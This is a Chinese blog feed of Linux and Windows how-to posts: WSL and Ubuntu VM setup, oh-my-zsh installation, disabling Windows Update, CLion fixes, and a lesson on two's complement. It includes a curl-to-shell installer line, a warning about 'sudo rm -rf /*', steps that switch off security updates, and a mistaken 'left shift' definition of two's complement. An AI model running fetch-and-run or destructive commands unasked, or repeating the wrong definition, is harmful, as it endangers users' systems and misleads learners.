class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><span class="line">deb https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p>以上都是国内的源问题不大。</p><img src="/2021/08/28/WindowsSubSystem/005.png" class=""><p><code>sudo vim /etc/apt/sources.list</code></p><p>进去先把高亮的注释掉，也就是在前面加上井号<br>vim使用小技巧，进入后先按<code>i</code>，然后方向键走，修改完之后按下<code>esc</code>，然后按下<code>:</code>,输入<code>wq</code>即为保存退出</p><img src="/2021/08/28/WindowsSubSystem/006.png" class="">这些事都要注释的<p>然后在最后面黏贴我们复制的，快捷键不一样，是<code>ctrl+shift+v</code>哦，或者鼠标右键哈哈</p><p>保存退出后，输入<code>sudo apt update</code>先更新一下仓库。<br>然后<code>sudo apt upgrade</code>下载需要的更新。</p><p>后续下载软件使用<code>sudo apt install 软件名 -y</code>即可，-y是默认表示yes，有些软件安装的时候会提示你yes or no的选项，这个就是直接输入yes的操作。</p><hr><h3 id="每日一遍"><a href="#每日一遍" class="headerlink" title="每日一遍"></a>每日一遍</h3><p>哈哈老梗了，当时有个<code>neofetch</code>的东西，显示个logo还有一些信息，被调侃linux别的学不到，每日上线一边<code>neofetch</code></p><p>下载<code>sudo apt install neofetch -y</code><br>效果图</p><img src="/2021/08/28/WindowsSubSystem/007.png" class=""><hr><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>c盘尽量大一点，因为商店的软件默认都是装c盘的，虽然网上有把子系统移动到别的盘上，但是不确认会有什么问题，加上我自己也没试过所以不建议</li><li>要升级wsl2自己百度，桌面版那些建议直接上虚拟机会更好。</li><li>win11好像在我的电脑里盘符下面可以直接看到linux，也就是说，可以图形化的拖动文件？！</li><li>其实主要子系统还是学习一下，可以在上面开发一些东西，或者学习shell</li><li>不要<code>sudo rm -rf /*</code></li></ol><hr><h2 id="几个小建议"><a href="#几个小建议" class="headerlink" title="几个小建议"></a>几个小建议</h2><ol><li>先学一些linux基础命令</li><li>了解一下linux用户体系，root和普通用户，这也是为什么要加sudo提权的缘由</li><li>然后自己找路子</li></ol><hr><h2 id="后期"><a href="#后期" class="headerlink" title="后期"></a>后期</h2><p>对于默认的解释器bash而言，功能比较糙。<br>我以前双系统的时候是选择zsh+ohmyzsh+powerlevelp10k这样搭配，玩的话一点哈哈<br>至于vim插件，主要是下的忒慢了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>对了卸载子系统请移驾<code>power shell</code><br>执行<code>wslconfig</code>会有相应的提示<br>其中<code>wslconfig /list</code>用于查看已安装的子系统<br><code>wslconfig /unregister name</code>用于卸载，记住后面的名字要跟list出来的对的上</p><blockquote><p>记住，任何大改动的地方修改完后都建议重启一下</p></blockquote><p>安装其实就那回事，如果安装不顺利请根据错误自行百度培养能力！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】虚拟机安装</title>
      <link href="/2021/07/30/ubuntu-install/"/>
      <url>/2021/07/30/ubuntu-install/</url>
      
        <content type="html"><![CDATA[<h1 id="环境-x2F-软件"><a href="#环境-x2F-软件" class="headerlink" title="环境&#x2F;软件"></a>环境&#x2F;软件</h1><ul><li>VMware Workstation-16</li><li>ubuntu-20.04-desktop-amd64.iso</li><li>windows10</li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><strong>对于双系统：</strong>amd的本子不是很推荐安装，因为苏妈没打钱，linux对amd的cpu核显有点糟糕，n卡就更别提了，新手不留意就会导致n卡掉了。</p><p>有需要可以划到下面<code>参考文章参考文献</code>一栏</p><hr><h2 id="iso下载"><a href="#iso下载" class="headerlink" title="iso下载"></a>iso下载</h2><p><a href="https://cn.ubuntu.com/?_ga=2.25907707.755102826.1650717944-1862494021.1649075648">中文站</a><br><a href="https://ubuntu.com/">正常官网</a></p><p>如果使用edge或者chrome就无所谓，反正能网页翻译。<br>找到下载或者download，去下载桌面系统即可。</p><p>这里需要强调一个问题，就是服务器毕竟是海外的，所以你在官网下载会很慢，除非你有科学道具[梯子]，或者你可以用迅雷下载。如果不想安装的那么我们可以去国内大学镜像站，例如<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学</a></p><p>这里直接到20.04那块<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/20.04/">戳此处</a><br>看到desktop-amd64.iso即可</p><hr><h2 id="vm下载"><a href="#vm下载" class="headerlink" title="vm下载"></a>vm下载</h2><p><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">戳此处</a></p><img src="/2021/07/30/ubuntu-install/000.png" class=""><p>点击下载，安装过程就不做太多介绍了<br>激活码网上一搜都是，或者使用player版本，那个好像免费的。</p><hr><h2 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h2><img src="/2021/07/30/ubuntu-install/001.png" class=""><p>点击创建新的虚拟机或者ctrl+n都一样。</p><img src="/2021/07/30/ubuntu-install/002.png" class=""><blockquote><p>这里典型和自定义都无所谓，自定义就是会更详细，对于新手用不到</p></blockquote><img src="/2021/07/30/ubuntu-install/003.png" class=""><blockquote><p>选择稍后安装，避免等会还要先调整分配的硬件资源</p></blockquote><img src="/2021/07/30/ubuntu-install/004.png" class=""><blockquote><p>至于这里就直接选linux和ubuntu，没用太多详细的版本，默认都没啥事的</p></blockquote><img src="/2021/07/30/ubuntu-install/005.png" class=""><blockquote><p>设置虚拟机的名称，以及存放的位置。</p></blockquote><img src="/2021/07/30/ubuntu-install/006.png" class=""><blockquote><p>设置磁盘大小，默认拆分成多个。</p></blockquote><img src="/2021/07/30/ubuntu-install/007.png" class=""><blockquote><p>如果还想调整，就点击自定义硬件</p></blockquote><img src="/2021/07/30/ubuntu-install/008.png" class=""><blockquote><p>默认都是正常的，除非你想减小分给虚拟机的内存和处理器。</p></blockquote><p>确认无误后：</p><img src="/2021/07/30/ubuntu-install/009.png" class=""><img src="/2021/07/30/ubuntu-install/010.png" class=""><blockquote><p>选择你之前下载镜像的文件夹位置。然后即可点击启动虚拟机</p></blockquote><img src="/2021/07/30/ubuntu-install/011.png" class=""><blockquote><p>20.04开始会检测一下系统文件，并不打紧。</p></blockquote><img src="/2021/07/30/ubuntu-install/012.png" class=""><blockquote><p>安装前我们先断开网络，因为默认镜像源处于国外，你联网系统默认会在安装时更新，到时候要等半天。</p></blockquote><img src="/2021/07/30/ubuntu-install/013.png" class=""><blockquote><p>断开后我们选择 install</p></blockquote><img src="/2021/07/30/ubuntu-install/014.png" class=""><img src="/2021/07/30/ubuntu-install/015.png" class=""><blockquote><p>这里你选择英语和中文都没啥关系，进去之后都能改，默认先选英语，点击continue。</p></blockquote><img src="/2021/07/30/ubuntu-install/016.png" class=""><blockquote><p>如果只是简单学习那么就选择下面最小安装即可。</p></blockquote><img src="/2021/07/30/ubuntu-install/017.png" class=""><blockquote><p>清除整块磁盘没事，他就是在我们划分的20g逻辑磁盘上做手脚，而且分配的20g，不是一开始就锁死，而是说文件存储上限会慢慢到20g。</p></blockquote><p>地区就选上海得了。</p><img src="/2021/07/30/ubuntu-install/018.png" class=""><p>用户名和计算机名，密码都自己设置一下，简单学习可以弄简单点。</p><img src="/2021/07/30/ubuntu-install/019.png" class=""><p>接下来就是等他安装然后进入系统。</p><img src="/2021/07/30/ubuntu-install/020.png" class=""><p>安装完后会提示你重启，点击重启下。</p><img src="/2021/07/30/ubuntu-install/021.png" class=""><p>鼠标点进去按下回车</p><p><strong>提示</strong>:前面可能忘了说，在没有安装VMware tools之前，你鼠标点进去发现出不来了，需要按ctrl+alt。</p><img src="/2021/07/30/ubuntu-install/022.png" class=""><blockquote><p>这些全都skip跳过即可</p></blockquote><hr><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>为什么说要换源呢，源就像一个软件商店一样，linux虽然有图形化的商店，但是不是很好用，建议都在终端敲命令，还能看到哪里缺依赖等报错信息。</p><img src="/2021/07/30/ubuntu-install/023.png" class=""><img src="/2021/07/30/ubuntu-install/024.png" class=""><p>这里随便选择阿里云做示范，选完后会提示输密码，就是之前安装的时候设置的。完成后窗口往左拖动，找到close。</p><img src="/2021/07/30/ubuntu-install/025.png" class=""><p>然后会提示刷新重新检索更新。点击reload。</p><p>然后我们打开终端[快捷键ctrl+alt+t]浅敲两个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt upgrade</span><br></pre></td></tr></table></figure><img src="/2021/07/30/ubuntu-install/026.png" class=""><p>可以看到其实系统以及提示有可用更新了，但是我们先常使用命令完成。</p><img src="/2021/07/30/ubuntu-install/027.png" class=""><p>输入y，代表yes。静静等待下载完毕。</p><hr><h4 id="vm-tools"><a href="#vm-tools" class="headerlink" title="vm tools"></a>vm tools</h4><p>没安装这个之前，你会发现你的ubuntu虚拟机分辨率就那个固定大小，而且不能拖文件进来或者出去<br>点击状态栏的虚拟机，找到安装VMware tools</p><img src="/2021/07/30/ubuntu-install/028.png" class=""><p>看到这个黄色的文件</p><img src="/2021/07/30/ubuntu-install/029.png" class=""><p>直接右击提取发现在这个文件夹下没有写入权限，最省事就是我们直接打开新文件夹拖进去</p><img src="/2021/07/30/ubuntu-install/030.png" class=""><p>然后右击extract here即可，再双击进入文件夹，直到看到install</p><img src="/2021/07/30/ubuntu-install/031.png" class=""><p>我们右击open terminal</p><img src="/2021/07/30/ubuntu-install/032.png" class=""><p>我们输入<code>sudo ./vmware-install.pl</code></p><img src="/2021/07/30/ubuntu-install/034.png" class=""><p>看到提示需要输入yes的就全输入yes，路径如[&#x2F;usr&#x2F;bin]的就回车。如果有问题就重新安装。</p><hr><p>至此基本操作都差不多，剩下就看用途了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>安装倒不是什么技术活，随便记录下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】终端改zsh使用powerlevel10k</title>
      <link href="/2021/07/07/ubuntu-terminal/"/>
      <url>/2021/07/07/ubuntu-terminal/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章是描写对与terminal中对zsh的美化插件过程,适用于ubuntu18.04、20.04，均为自己试验过。</p><hr><span id="more"></span><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-zsh-x2F-ohmyzsh"><a href="#1-zsh-x2F-ohmyzsh" class="headerlink" title="1. zsh&#x2F;ohmyzsh"></a>1. zsh&#x2F;ohmyzsh</h2><p>首先打开terminal，安装<code>zsh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install zsh  <span class="comment">#18.04以后apt可以不带-get了</span></span><br></pre></td></tr></table></figure><p>然后你可以先切换到zsh或者直接安装ohmyzsh作为基础都行，因为安装了ohmyzsh之后默认会改成zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#curl</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"><span class="comment">#wget</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>上述两者为常用项，没有安装可以<code>apt install</code>安装一下。<br>然后就碰到了一个问题，由于<code>raw.githubusercontent.com</code>存在dns污染，很有可能找不到目标。<br>故此我们通过<a href="https://www.ipaddress.com/">ipaddress</a>,输入域名，获取到返回的四个ip。</p><blockquote><p>没记错的话是四个</p></blockquote><p>此处就直接列出来了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">185.199.108.133 raw.githubusercontent.com</span><br><span class="line">185.199.109.133 raw.githubusercontent.com</span><br><span class="line">185.199.110.133 raw.githubusercontent.com</span><br><span class="line">185.199.111.133 raw.githubusercontent.com</span><br></pre></td></tr></table></figure><p>将其写入hosts文件，Linux下路径为<code>/etc/hosts</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vim /etc/hosts</span><br><span class="line"><span class="comment">#如果没有vim，请先apt install vim使用</span></span><br></pre></td></tr></table></figure><p>修改完之后重复之前的命令，能够正确下载并执行即可。到底终端已经变成ohmyzsh为主题，如果没有可以尝试注销或重启。</p><hr><h2 id="2-powerlevel10k"><a href="#2-powerlevel10k" class="headerlink" title="2. powerlevel10k"></a>2. powerlevel10k</h2><p>然后是比较花里胡哨的主题<code>powerlevle10k</code><br>默认情况下terminal是不支持花里胡哨的字体的，有科学道具的可以上github访问<a href="https://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k">powerlevel10k</a>,找到font那块，去下载一个完整的字体包。没有条件的可以先安装一个简单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install fonts-powerline</span><br></pre></td></tr></table></figure><p>然后根据步骤下面<code>git clone</code>文件，没有安装的也先apt install git。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git ~/powerlevel10k</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;source ~/powerlevel10k/powerlevel10k.zsh-theme&#x27;</span> &gt;&gt;~/.zshrc</span><br><span class="line"><span class="comment">#此处copy的国内gitee，会快很多</span></span><br><span class="line">$ git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure><blockquote><p>到此基本没啥问题了，在选择p10k的主题时注意选择unicode编码，不然无法显示特殊字体</p></blockquote><hr><h2 id="3-插件"><a href="#3-插件" class="headerlink" title="3.插件"></a>3.插件</h2><p>个人觉得这个插件用处还是挺大的，功能就是会记忆以前输过的指令，以灰色字样，你可以tab快速对齐。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>将文件下载到ohmyzsh目录下后，需修改<code>~/.zshrc</code>已启用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编辑~/.zshrc   </span></span><br><span class="line">$ vim ~/.zshrc   </span><br><span class="line"><span class="comment">#-------------------------------------</span></span><br><span class="line"><span class="comment"># 在plugins后括号里添加安装的插件名字</span></span><br><span class="line">plugins=( git </span><br><span class="line">          zsh-autosuggestions </span><br><span class="line">            )</span><br><span class="line"><span class="comment"># :wq保存并退出</span></span><br><span class="line"><span class="comment"># 最后刷新</span></span><br><span class="line">$ <span class="built_in">source</span> ~/.zshrc  </span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>按照步骤正常一般无问题，如果zsh先装了p10k再装ohmyzsh的话，可能默认的插件功能会没下过来<br>原文是我在csdn上写的，因为自己开博客了搬回来用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winUpdate</title>
      <link href="/2021/02/21/winUpdate/"/>
      <url>/2021/02/21/winUpdate/</url>
      
        <content type="html"><![CDATA[<h1 id="卡win10更新"><a href="#卡win10更新" class="headerlink" title="卡win10更新"></a>卡win10更新</h1><span id="more"></span><hr><h1 id="虽然不知道有没有得用，凑合玩玩也是百度的"><a href="#虽然不知道有没有得用，凑合玩玩也是百度的" class="headerlink" title="虽然不知道有没有得用，凑合玩玩也是百度的"></a>虽然不知道有没有得用，凑合玩玩也是百度的</h1><hr><h2 id="禁用windows-update"><a href="#禁用windows-update" class="headerlink" title="禁用windows update"></a>禁用windows update</h2><ol><li>win+r 打开 运行，输入<code>services.msc</code>，回车</li><li>找到windows Update，双击打开点击停止，将启动类型选为“禁用”，点击应用</li><li>切到恢复选项，将默认的重新启动服务改为误操作，点击应用，然后确定</li></ol><hr><h2 id="修改组策略"><a href="#修改组策略" class="headerlink" title="修改组策略"></a>修改组策略</h2><ol><li>win+r 打开运行，输入<code>gpedit.msc</code>，回车</li><li>在编辑器中，依次展开计算机配置-管理模板-windows组件-windows更新</li><li>找到配置自动更新设置，点击编辑策略设置，将其设置为已禁用，然后点击应用，点击确定</li><li>之后还需要再找到“删除使用所有Windows更新功能的访问权限”，选择已启用，完成设置后，点击应用，点击确定。</li></ol><hr><h2 id="禁用任务计划"><a href="#禁用任务计划" class="headerlink" title="禁用任务计划"></a>禁用任务计划</h2><ol><li>win+r打开运行，输入<code>taskschd.msc</code>，回车</li><li>依次展开任务计划程序库 -&gt; Microsoft -&gt; Windows -&gt; WindowsUpdate，里面可能有两个或者一个，选中一个点击设置为禁用</li></ol><hr><h2 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h2><ol><li>win+r 打开运行，输入<code>regedit</code>，回车</li><li>依次展开[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsoSvc]先找到start，点击修改，选择十六进制，值改为<code>4</code>。</li><li>然后找到<code>FailureActions</code>，右击修改二进制数据，将0018那行的第三组数据改为<code>00</code></li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>具体效果不好说，但是至少看到windows更新受到限制。</p><img src="/2021/02/21/winUpdate/000.png" class=""><p><strong>目的只是记录，免得下次改不回来</strong></p><p>禁用更新的初衷是太频繁了，虽然有些更新是好的补丁，但是有些就不好说了，而且更新不一定就好，也会出问题，所以选个版本卡死就行。不确定的就像我这样记录下来以免下次出问题改回去。</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】无法打开snap安装的clion</title>
      <link href="/2021/02/06/ubuntu-clion/"/>
      <url>/2021/02/06/ubuntu-clion/</url>
      
        <content type="html"><![CDATA[<h1 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h1><ul><li>ubuntu 20.04</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>snap安装的clion和idea图标存在但是无法打开</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo snap remove clion</span><br></pre></td></tr></table></figure><p>本来想先通过snap remove卸载掉看看的，然后发现报错了：</p><blockquote><p>(eval):1: _snap: function definition file not found</p></blockquote><p>网上搜索了一下，好像没用特别符合的情况</p><p>官网下载安装肯定和snap不一样，然后只能去看看snap目录下是不是卸载的时候误删了什么。<br>找了一圈别人正常的情况，发现少了个snapd。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install snapd</span><br></pre></td></tr></table></figure><p>重新安装了一下，结果就正常了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>当时可能软件下来下去，环境弄来弄去，删除的时候可能不小心全带走了。<br>不过Linux该折腾就还是得折腾几下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clion控制台中文乱码</title>
      <link href="/2021/01/30/cliontoutf-8/"/>
      <url>/2021/01/30/cliontoutf-8/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jetbrains.com/zh-cn/clion/download/#section=windows">官网下载链接</a></p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>jetbrains系列的软件其实还挺好用的。<br>但是windows平台的编码是真的搞。<br>方法应该是通用的对于jb系列的软件——此处以clion为例。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先就是安装clion，上述参考链接含官网下载地址。</p><p>网上不靠谱的就是让你把文件编码改成<code>GBK</code>，这种就是典型治标不治本的做法；比较常用编码大部分是<code>utf-8</code>。当然win平台常见的是ANSI和Unicode两种，这里就是浅浅的改变成utf-8，不需要的则没关系。</p><h2 id="1-setting"><a href="#1-setting" class="headerlink" title="1.setting"></a>1.setting</h2><p>打开file，找到setting</p><img src="/2021/01/30/cliontoutf-8/000.png" class=""><blockquote><p>找到Editor，选择Console，将default encoding也修改成utf-8</p></blockquote><img src="/2021/01/30/cliontoutf-8/001.png" class=""><blockquote><p>再在Editor下找到file encodings，全设置为utf-8</p></blockquote><img src="/2021/01/30/cliontoutf-8/002.png" class=""><blockquote><p>找到我们clion的安装目录下的Bin&#x2F;,看到这个clion64.exe.vmoptions之后用记事本或者notepad打开都行，在末尾加上一句-Dfile.encoding&#x3D;UTF-8</p></blockquote><img src="/2021/01/30/cliontoutf-8/003.png" class=""><img src="/2021/01/30/cliontoutf-8/004.png" class=""><blockquote><p>如果是idea好像还有个idea.exe.vmoptions，也就是不带64的，估计是32位的意思吧，反正都加上。</p></blockquote><p>然后在clion界面，按住<code>Ctrl+Shift+Alt+/</code>，选择Registry，取消run.processes.with.pty的勾选。</p><p>不放心还可以在：</p><img src="/2021/01/30/cliontoutf-8/005.png" class=""><img src="/2021/01/30/cliontoutf-8/006.png" class=""><blockquote><p>加一句-Dfile.encoding&#x3D;UTF-8</p></blockquote><p>至于终端类型切不切换都无所谓，一个cmd或者一个powershell</p><img src="/2021/01/30/cliontoutf-8/007.png" class=""><p>然后开始测试一下：</p><img src="/2021/01/30/cliontoutf-8/008.png" class=""><p>点击右上角的锤子然后点击小箭头，也可以快捷键操作。</p><img src="/2021/01/30/cliontoutf-8/009.png" class=""><p>看到中文正常显示就行了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>idea不常用就不写了,<br>可以参考一下clion，毕竟都是一个公司的产品<br>或者百度搜索这个版本的</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jetbrains </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原码、反码、补码的关系</title>
      <link href="/2021/01/01/threeYards/"/>
      <url>/2021/01/01/threeYards/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>计算机三码的问题我记得很早的时候在本地typora上写过后面好像丢了。<br>但是还是要加强一下印象，就回头在写到博客上好了。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先，三码是哪三码：原码、反码、补码；</p><hr><h2 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h2><p>原码可不是一个数简单转换成二进制就完事了，需要注意的是在二进制的最高位是代表了符号位，也就是说代表了这个数是整数还是负数，0表示正数，1则表示负数。</p><p><strong>本文介绍统一采用一字节的方式举例</strong><br>例如<code>86</code>的原码应该是<code>0101 0110</code>;<br>而<code>-86</code>的原码则是<code>1101 0110</code>;</p><blockquote><p>此时切记不能将原码和传统二进制混淆。</p></blockquote><hr><h2 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h2><p>正数的反码与原码一致，负数的反码除去符号位，其余取反。<br>还是<code>86</code>为例，它的反码依然是<code>0101 0110</code>;<br>而<code>-86</code>，它的反码则是<code>1010 1001</code>。</p><hr><h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p>正数的补码依然与原码一致，负数的补码则是在反码基础上左位移1位。<br><code>86</code>的补码为<code>0101 0110</code>;<br><code>-86</code>的补码为<code>1010 1010</code>;</p><hr><p>那么为什么要这么麻烦呢，起初发明原码的目的就是为了能够很好的区分出正负的概念，使用原码的方式读写，是方便了人，但是计算机就吃苦了。</p><p><code>(+1) + (-1)=0</code>这是常识，但是转换成原码<code>0000 0001 + 1000 0001 = 1000 0010</code>，<code>1000 0010</code>按照原码的概念高位为符号位，就成了<code>-2</code>，这就变成搬起石头砸自己的脚了。</p><p>所以在原码的基础上，又产生了反码的概念，上述提过，反码的目的其实也是为了解决负数的问题<br><code>(+1) + (-1) = 0</code>还是这个题<br>换成原码时：<code>0000 0001 + 1000 0001 = 1000 0010</code><br>加入反码后：<code>0000 0001 + 1111 1110 = 1111 1111</code><br>正数的0我们知道原码应该是<code>0000 0000</code>，但是这里的结果是<code>1111 1111</code>。<br>首先这个<code>1111 1111</code>还是处于反码的阶段，我们将其转换为原码：<code>1000 0000</code>。<br>而这一比较就会发现，转换后的原码解读应该是<code>-0</code>。<br>虽然结果有那点意思了，但是数学常识0就是0，没有正负之分才对。</p><p>最后在不断折磨下，又出现了补码，所以说正数的三码为什么都是一个样的，反码和补码的出现都是为了解决负数的问题。<br>补码就是反码+1，所以当<code>-1</code>的反码<code>1111 1110</code>转换成补码后应该是<code>1111 1111</code><br>正数的三码一致，<code>(+1) + (-1) = 0</code>，变成补码形式<code>0000 0001 + 1111 1111 = 1 0000 0000</code>,一字节的情况下只能表示8个比特，所以最高位会被丢弃掉。也就是<code>0000 0000</code>，也就是我们计算机和数学中最为正确的0。</p><blockquote><p>在明白了基础概念之后，我们可以浅浅的随便算几个数字之和情况下三码的形式。</p></blockquote><hr><h2 id="86-67"><a href="#86-67" class="headerlink" title="(+86) + (-67)"></a>(+86) + (-67)</h2><p>原码：<code>0101 0110 + 1100 0011</code><br>反码：<code>0101 0110 + 1011 1100</code><br>补码：<code>0101 0110 + 1011 1101</code><br>最后之和：<code>1 0001 0011</code>，丢弃多余的高位，转换成十进制也就是19</p><hr><h2 id="96-36"><a href="#96-36" class="headerlink" title="(+96) + (-36)"></a>(+96) + (-36)</h2><p>原码：<code>0110 0000 + 1010 0100</code><br>反码：<code>0110 0000 + 1101 1011</code><br>补码：<code>0110 0000 + 1101 1100</code><br>求和：<code>1 0011 1100</code>，丢弃多余的，转换成十进制就是60</p><hr><h2 id="101-27"><a href="#101-27" class="headerlink" title="(101) - (-27)"></a>(101) - (-27)</h2><p>老算加法没意思，回头看看减法呢？<br>这里也是要提的点，计算机本身其实是比较笨的，因为他只会进行+运算，原因在于计算机是通过电路设计的，那么交给他的活自然不能太繁琐，且在数学领域下，减去一个正数就等于加上这个正数变成负数的值：即<code>1-1 = 1 + (-1) = 0</code>，这也是为什么上述两个计算题还是使用加法的问题，其实<code>(+86) + (-67)</code>就是等于<code>86-67</code>。所以减法也不例外，减去一个负数就等于加上这个负数变符号成正数的结果。<br>故此<code>(101) - (-27) = 101 + 27 = 128</code></p><p>计算方式如下：<br>原码：<code>0110 0101 + 0001 1011</code><br>反码：<code>0110 0101 + 0001 1011</code><br>补码：<code>0110 0101 + 0001 1011</code><br>求和：<code>1000 0000</code>，现在按照原码或者反码来说它又是-0，实际上二进制应该表示为128了，但0已经有了它自己的编码<code>0000 0000</code>，所以补码<code>1000 